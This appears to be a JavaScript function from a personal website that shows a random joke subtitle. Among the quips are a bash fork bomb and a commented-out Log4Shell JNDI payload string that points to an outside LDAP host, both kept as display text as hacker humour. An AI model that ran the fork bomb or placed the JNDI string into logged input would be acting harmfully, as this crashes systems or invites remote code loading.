function randomQuote(){

	let e = document.getElementById("main_subtitle");

	quotes = ['Funniest <br>shit i\'ve <br>ever seen.', 
	'I simply am not<br> there.', 
	//'NFT? Never <br>Felt Titties?',
	'I build stuff, <br>sometimes it <\bbr>s.',
	'Build, fly, <br>crash, repeat.',
	'Crypto avoider. <br>Fiat enthusiast.',
	'I drive.',
	'p̶̡̣͎̏͗́́̈́̂̋͗̊́e̴̡̻̹͓͖̩͇̼̦͂̎e̶̜͇̮̚ ̵̪͐̿̈́͝p̵̛͕̺̜̖̤̮̜̠̻̪̒̍̿̔̾̈̌̐͘͘͘͜ͅe̸͉͔̮̻̙͊̂́̃͝e̶̩͎͉̓ ̶̧̤̣̞̃̊̆̆̈p̶̘̙͔̲͍͌̔̑̀͛̅̅̂̾̃̕o̵̧͕̰̟̣̫̠̲͌̕o̵̮̤̩̞͙̹̩̽̈́̐̂͐͛̐́͠͠͝ ̸̢̪̰͖͖̰̑̆͒̈̓̈́̉͠p̶̣̳̑̾͊͑̓̉͑̐͌o̶͓̩̤͗̈́̓̉̏̐́̕͠͝o̴͎̾̽͒̌́̃̇̾̄͝',
	//'${jndi:ldap://seemsleg.it:1389/notmalware}',
	':(){ :|: & };:',
	'&nbsp&nbsp()-()<br>'+
    '.-(___)-.<br>'+
    '&nbsp&nbsp_<   >_<br>'+
	'&nbsp\\/&nbsp&nbsp&nbsp\\/<br>',
	'&nbsp&nbsp.---------.<br>'+
  	'&nbsp&nbsp|.-------.|<br>'+
  	'&nbsp&nbsp||>run#&nbsp&nbsp||<br>'+
  	'&nbsp&nbsp||&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp||<br>'+
  	'&nbsp&nbsp|"-------\'|<br>'+
	'.-^---------^-.<br>'+
	'|&nbsp---~&nbsp&nbsp&nbspAMiGA|<br>'+
	'"-------------\'<br>']

	e.innerHTML = quotes[Math.floor(Math.random() * quotes.length)];

}